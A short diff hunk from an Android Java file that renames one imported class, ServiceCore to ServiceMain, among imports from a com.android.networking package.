@@ -26,7 +26,7 @@ import android.os.Bundle;
 import com.android.networking.CellInfo;
 import com.android.networking.Core;
 import com.android.networking.Device;
-import com.android.networking.ServiceCore;
+import com.android.networking.ServiceMain;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
